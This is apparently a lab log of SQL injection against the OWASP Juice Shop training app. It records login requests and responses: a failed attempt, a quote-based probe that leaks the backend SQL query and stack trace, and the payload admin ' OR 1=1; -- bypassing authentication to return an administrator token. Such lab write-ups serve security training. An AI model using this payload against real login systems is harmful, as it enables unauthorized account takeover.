# SQL Injection Logs (Logged In as administrator)

## Logs

### Invalid Credentials

#### Request

POST /rest/user/login HTTP/1.1
Content-Type: application/json
{"email":"admin", "password":"admin"}

#### Response

HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=utf-8
Invalid email or password.


### SQL Query Error

#### Request

POST /rest/user/login HTTP/1.1
Content-Type: application/json
{"email":"admin '", "password":"admin"}

#### Response

HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
{
  "error": {
    "message": "SQLITE_ERROR: unrecognized token: \"21232f297a57a5a743894a0e4a801fc3\"",
    "stack": "Error\n    at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50\n    at new Promise (<anonymous>)\n    at Query.run (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)\n    at /juice-shop/node_modules/sequelize/lib/sequelize.js:315:28\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)",
    "name": "SequelizeDatabaseError",
    "parent": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = 'admin '' AND password = '21232f297a57a5a743894a0e4a801fc3' AND deletedAt IS NULL"
    },
    "original": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = 'admin '' AND password = '21232f297a57a5a743894a0e4a801fc3' AND deletedAt IS NULL"
    },
    "sql": "SELECT * FROM Users WHERE email = 'admin '' AND password = '21232f297a57a5a743894a0e4a801fc3' AND deletedAt IS NULL",
    "parameters": {}
  }
}


### Logging in as admin with SQL Injection

#### Request

POST /rest/user/login HTTP/1.1
Content-Type: application/json
{"email":"admin ' OR 1=1; --","password":"admin"}

#### Response

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDMtMzEgMTg6MTM6MTcuMjQ1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDMtMzEgMTg6MTM6MTcuMjQ1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc0MzQ1NDE5M30.NQE-ptXO9MpHAUcf7y1stCMsy-8Uqez3qcCiL-STNC6_XyLzZExZ7ewRM6rFT22rOUw10bUyEY4mJD5HfQzHRwIDppI0i1D38-SYg_VXGePLD-SqB-Nu4XbLkCo2_ei5ofVsgQpW57Jvcu48zZrmjmcUivZYLcjlyD9sADdAm5M","bid":1,"umail":"admin@juice-sh.op"}}